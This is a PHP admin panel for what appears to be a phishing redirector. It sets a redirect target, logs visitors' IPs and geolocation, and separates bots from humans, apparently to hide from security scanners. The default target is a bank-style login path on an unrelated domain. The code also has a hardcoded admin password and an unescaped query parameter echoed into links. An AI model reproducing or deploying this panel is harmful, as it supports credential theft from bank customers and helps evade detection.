<?php

session_start();

$configFile = __DIR__ . '/data/config.json';
$visitorsFile = __DIR__ . '/data/visitors.json';
$password = 'yostass123@';

if (isset($_POST['logout'])) {
    session_destroy();
    header('Location: admin.php');
    exit;
}

if (!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) {
    $loginError = '';
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if (hash_equals($password, $_POST['password'])) {
            $_SESSION['admin_logged_in'] = true;
            $_SESSION['admin_ip'] = $_SERVER['REMOTE_ADDR'];
            header('Location: admin.php');
            exit;
        } else {
            $loginError = 'Wrong password';
        }
    }
    ?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#0f0f23;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#e0e0e0}
.login-box{background:#1a1a2e;padding:40px;border-radius:12px;box-shadow:0 8px 32px rgba(0,0,0,0.4);width:360px}
.login-box h2{text-align:center;margin-bottom:25px;color:#7c83ff}
.login-box input[type=password]{width:100%;padding:12px 16px;border:1px solid #333;background:#16213e;color:#e0e0e0;border-radius:8px;font-size:15px;margin-bottom:15px;outline:none;transition:border-color 0.3s}
.login-box input[type=password]:focus{border-color:#7c83ff}
.login-box button{width:100%;padding:12px;border:none;background:#7c83ff;color:#fff;font-size:15px;border-radius:8px;cursor:pointer;transition:background 0.3s}
.login-box button:hover{background:#6a71e0}
.error{color:#ff6b6b;text-align:center;margin-bottom:15px;font-size:14px}
</style>
</head>
<body>
<div class="login-box">
<h2>Admin Panel</h2>
<?php if ($loginError): ?>
<div class="error"><?php echo htmlspecialchars($loginError, ENT_QUOTES, 'UTF-8'); ?></div>
<?php endif; ?>
<form method="POST">
<input type="password" name="password" placeholder="Password" required autofocus>
<button type="submit">Login</button>
</form>
</div>
</body>
</html>
    <?php
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['destination'])) {
    $newDest = trim($_POST['destination']);
    if (filter_var($newDest, FILTER_VALIDATE_URL)) {
        $config = array('destination' => $newDest);
        file_put_contents($configFile, json_encode($config, JSON_PRETTY_PRINT));
    }
    header('Location: admin.php');
    exit;
}

if (isset($_POST['clear_visitors'])) {
    file_put_contents($visitorsFile, '[]');
    header('Location: admin.php');
    exit;
}

$config = json_decode(file_get_contents($configFile), true);
$destination = isset($config['destination']) ? $config['destination'] : 'https://microcix.com/tmp/dkb/dkb/Login/';
$visitors = json_decode(file_get_contents($visitorsFile), true);
if (!is_array($visitors)) $visitors = array();

$totalVisitors = count($visitors);
$totalBots = 0;
$totalHumans = 0;
$uniqueIps = array();
foreach ($visitors as $v) {
    if ($v['is_bot']) $totalBots++;
    else $totalHumans++;
    $uniqueIps[$v['ip']] = true;
}
$uniqueCount = count($uniqueIps);

$page = isset($_GET['page']) ? max(1, intval($_GET['page'])) : 1;
$perPage = 50;
$totalPages = max(1, ceil($totalVisitors / $perPage));
$page = min($page, $totalPages);
$offset = ($page - 1) * $perPage;
$currentVisitors = array_slice($visitors, $offset, $perPage);

$filterType = isset($_GET['filter']) ? $_GET['filter'] : 'all';

?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Admin Panel</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#0f0f23;color:#e0e0e0;min-height:100vh}
.container{max-width:1400px;margin:0 auto;padding:20px}
.header{display:flex;justify-content:space-between;align-items:center;margin-bottom:30px;flex-wrap:wrap;gap:10px}
.header h1{color:#7c83ff;font-size:24px}
.logout-btn{padding:8px 20px;background:#ff4757;border:none;color:#fff;border-radius:6px;cursor:pointer;font-size:13px;transition:background 0.3s}
.logout-btn:hover{background:#e84141}
.card{background:#1a1a2e;border-radius:12px;padding:25px;margin-bottom:20px;box-shadow:0 4px 16px rgba(0,0,0,0.3)}
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:15px;margin-bottom:20px}
.stat-box{background:#16213e;border-radius:10px;padding:20px;text-align:center}
.stat-box .number{font-size:32px;font-weight:700;color:#7c83ff}
.stat-box .label{font-size:13px;color:#888;margin-top:5px;text-transform:uppercase;letter-spacing:1px}
.dest-form{display:flex;gap:10px;flex-wrap:wrap;align-items:center}
.dest-form input[type=url]{flex:1;min-width:300px;padding:12px 16px;border:1px solid #333;background:#16213e;color:#e0e0e0;border-radius:8px;font-size:14px;outline:none;transition:border-color 0.3s}
.dest-form input[type=url]:focus{border-color:#7c83ff}
.dest-form button{padding:12px 24px;border:none;background:#7c83ff;color:#fff;border-radius:8px;cursor:pointer;font-size:14px;transition:background 0.3s;white-space:nowrap}
.dest-form button:hover{background:#6a71e0}
.current-dest{margin-bottom:15px;font-size:14px;color:#888}
.current-dest a{color:#7c83ff;text-decoration:none;word-break:break-all}
.toolbar{display:flex;justify-content:space-between;align-items:center;margin-bottom:15px;flex-wrap:wrap;gap:10px}
.filter-bar{display:flex;gap:8px;flex-wrap:wrap}
.filter-btn{padding:6px 16px;border:1px solid #333;background:#16213e;color:#e0e0e0;border-radius:6px;cursor:pointer;font-size:13px;transition:all 0.3s;text-decoration:none}
.filter-btn:hover,.filter-btn.active{background:#7c83ff;color:#fff;border-color:#7c83ff}
.clear-btn{padding:6px 16px;background:#ff4757;border:none;color:#fff;border-radius:6px;cursor:pointer;font-size:13px}
table{width:100%;border-collapse:collapse}
thead th{background:#16213e;padding:12px 10px;text-align:left;font-size:13px;color:#888;text-transform:uppercase;letter-spacing:0.5px;position:sticky;top:0}
tbody tr{border-bottom:1px solid #1e1e3a;transition:background 0.2s}
tbody tr:hover{background:#16213e}
tbody td{padding:10px;font-size:13px;max-width:250px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.badge{display:inline-block;padding:3px 10px;border-radius:12px;font-size:11px;font-weight:600}
.badge-bot{background:rgba(255,71,87,0.15);color:#ff4757}
.badge-human{background:rgba(46,213,115,0.15);color:#2ed573}
.flag{width:20px;height:15px;vertical-align:middle;margin-right:6px;border-radius:2px}
.pagination{display:flex;justify-content:center;gap:5px;margin-top:20px;flex-wrap:wrap}
.pagination a,.pagination span{padding:8px 14px;border-radius:6px;font-size:13px;text-decoration:none;transition:all 0.3s}
.pagination a{background:#16213e;color:#e0e0e0;border:1px solid #333}
.pagination a:hover{background:#7c83ff;color:#fff;border-color:#7c83ff}
.pagination .current{background:#7c83ff;color:#fff}
.empty{text-align:center;padding:40px;color:#666;font-size:15px}
@media (max-width:768px){.dest-form input[type=url]{min-width:100%}table{font-size:12px}tbody td{padding:8px 6px}}
</style>
</head>
<body>
<div class="container">
<div class="header">
<h1>Redirection Panel</h1>
<form method="POST" style="display:inline">
<input type="hidden" name="logout" value="1">
<button type="submit" class="logout-btn">Logout</button>
</form>
</div>

<div class="stats">
<div class="stat-box">
<div class="number"><?php echo $totalVisitors; ?></div>
<div class="label">Total Visits</div>
</div>
<div class="stat-box">
<div class="number"><?php echo $totalHumans; ?></div>
<div class="label">Humans</div>
</div>
<div class="stat-box">
<div class="number"><?php echo $totalBots; ?></div>
<div class="label">Bots</div>
</div>
<div class="stat-box">
<div class="number"><?php echo $uniqueCount; ?></div>
<div class="label">Unique IPs</div>
</div>
</div>

<div class="card">
<h3 style="margin-bottom:15px;color:#7c83ff">Redirect Destination</h3>
<div class="current-dest">Current: <a href="<?php echo htmlspecialchars($destination, ENT_QUOTES, 'UTF-8'); ?>" target="_blank"><?php echo htmlspecialchars($destination, ENT_QUOTES, 'UTF-8'); ?></a></div>
<form method="POST" class="dest-form">
<input type="url" name="destination" placeholder="https://example.com" required value="<?php echo htmlspecialchars($destination, ENT_QUOTES, 'UTF-8'); ?>">
<button type="submit">Update</button>
</form>
</div>

<div class="card">
<div class="toolbar">
<div class="filter-bar">
<a href="?filter=all" class="filter-btn <?php echo $filterType==='all'?'active':''; ?>">All</a>
<a href="?filter=humans" class="filter-btn <?php echo $filterType==='humans'?'active':''; ?>">Humans</a>
<a href="?filter=bots" class="filter-btn <?php echo $filterType==='bots'?'active':''; ?>">Bots</a>
</div>
<form method="POST" onsubmit="return confirm('Clear all visitor data?')">
<input type="hidden" name="clear_visitors" value="1">
<button type="submit" class="clear-btn">Clear All</button>
</form>
</div>

<div style="overflow-x:auto">
<table>
<thead>
<tr>
<th>#</th>
<th>Date & Time</th>
<th>IP Address</th>
<th>Country</th>
<th>City</th>
<th>Referrer</th>
<th>Type</th>
<th>User Agent</th>
</tr>
</thead>
<tbody>
<?php
$filtered = array();
foreach ($visitors as $v) {
    if ($filterType === 'humans' && $v['is_bot']) continue;
    if ($filterType === 'bots' && !$v['is_bot']) continue;
    $filtered[] = $v;
}
$filteredTotal = count($filtered);
$totalPages = max(1, ceil($filteredTotal / $perPage));
$page = min($page, $totalPages);
$offset = ($page - 1) * $perPage;
$pageVisitors = array_slice($filtered, $offset, $perPage);

if (empty($pageVisitors)):
?>
<tr><td colspan="8" class="empty">No visitors yet</td></tr>
<?php else:
$counter = $offset;
foreach ($pageVisitors as $v):
$counter++;
$cc = isset($v['country_code']) ? htmlspecialchars($v['country_code'], ENT_QUOTES, 'UTF-8') : 'xx';
$flagUrl = 'https://flagcdn.com/w40/' . $cc . '.png';
?>
<tr>
<td><?php echo $counter; ?></td>
<td><?php echo htmlspecialchars($v['timestamp'], ENT_QUOTES, 'UTF-8'); ?></td>
<td><strong><?php echo htmlspecialchars($v['ip'], ENT_QUOTES, 'UTF-8'); ?></strong></td>
<td><img src="<?php echo $flagUrl; ?>" class="flag" alt="<?php echo $cc; ?>" onerror="this.style.display='none'"><?php echo htmlspecialchars($v['country'], ENT_QUOTES, 'UTF-8'); ?></td>
<td><?php echo htmlspecialchars($v['city'], ENT_QUOTES, 'UTF-8'); ?></td>
<td title="<?php echo htmlspecialchars($v['referer'], ENT_QUOTES, 'UTF-8'); ?>"><?php echo htmlspecialchars($v['referer'], ENT_QUOTES, 'UTF-8'); ?></td>
<td><?php echo $v['is_bot'] ? '<span class="badge badge-bot">Bot</span>' : '<span class="badge badge-human">Human</span>'; ?></td>
<td title="<?php echo htmlspecialchars($v['user_agent'], ENT_QUOTES, 'UTF-8'); ?>"><?php echo htmlspecialchars(substr($v['user_agent'], 0, 80), ENT_QUOTES, 'UTF-8'); ?></td>
</tr>
<?php endforeach; endif; ?>
</tbody>
</table>
</div>

<?php if ($totalPages > 1): ?>
<div class="pagination">
<?php if ($page > 1): ?>
<a href="?page=<?php echo $page-1; ?>&filter=<?php echo $filterType; ?>">&laquo;</a>
<?php endif; ?>
<?php
$start = max(1, $page - 3);
$end = min($totalPages, $page + 3);
for ($i = $start; $i <= $end; $i++):
?>
<?php if ($i === $page): ?>
<span class="current"><?php echo $i; ?></span>
<?php else: ?>
<a href="?page=<?php echo $i; ?>&filter=<?php echo $filterType; ?>"><?php echo $i; ?></a>
<?php endif; ?>
<?php endfor; ?>
<?php if ($page < $totalPages): ?>
<a href="?page=<?php echo $page+1; ?>&filter=<?php echo $filterType; ?>">&raquo;</a>
<?php endif; ?>
</div>
<?php endif; ?>

</div>
</div>
</body>
</html>